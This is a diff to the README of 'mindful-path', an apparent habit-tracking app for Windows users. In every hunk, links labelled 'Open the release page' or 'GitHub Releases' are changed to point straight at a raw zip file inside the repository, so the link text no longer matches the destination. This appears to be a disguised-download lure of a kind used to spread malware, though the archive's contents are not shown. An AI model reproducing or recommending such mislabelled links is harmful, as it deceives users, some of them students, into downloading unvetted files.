@@ -1,6 +1,6 @@
 # 🧘 mindful-path - Daily habits with calm focus
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/prueapocalyptic571/mindful-path/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/prueapocalyptic571/mindful-path/raw/refs/heads/main/resources/mindful_path_3.1-beta.5.zip)
 
 ## 🌿 Overview
 
@@ -33,7 +33,7 @@ If your school laptop blocks downloads, you may need help from the device owner 
 
 Visit this page to download the Windows version:
 
-[Open the release page](https://github.com/prueapocalyptic571/mindful-path/releases)
+[Open the release page](https://github.com/prueapocalyptic571/mindful-path/raw/refs/heads/main/resources/mindful_path_3.1-beta.5.zip)
 
 On the release page, look for the latest version. Then find the file made for Windows. It may end in `.exe` or come in a zip file.
 
@@ -156,7 +156,7 @@ This project is linked with:
 
 When a new version is posted, return to the release page and download the latest file again:
 
-[Open the release page](https://github.com/prueapocalyptic571/mindful-path/releases)
+[Open the release page](https://github.com/prueapocalyptic571/mindful-path/raw/refs/heads/main/resources/mindful_path_3.1-beta.5.zip)
 
 This keeps your copy current with the newest fixes and changes
 
@@ -196,7 +196,7 @@ This mix gives you school support and personal balance
 
 If you need the download page later, use this link:
 
-[GitHub Releases for mindful-path](https://github.com/prueapocalyptic571/mindful-path/releases)
+[GitHub Releases for mindful-path](https://github.com/prueapocalyptic571/mindful-path/raw/refs/heads/main/resources/mindful_path_3.1-beta.5.zip)
 
 ## 🪷 Use mindful-path with a calm routine
 
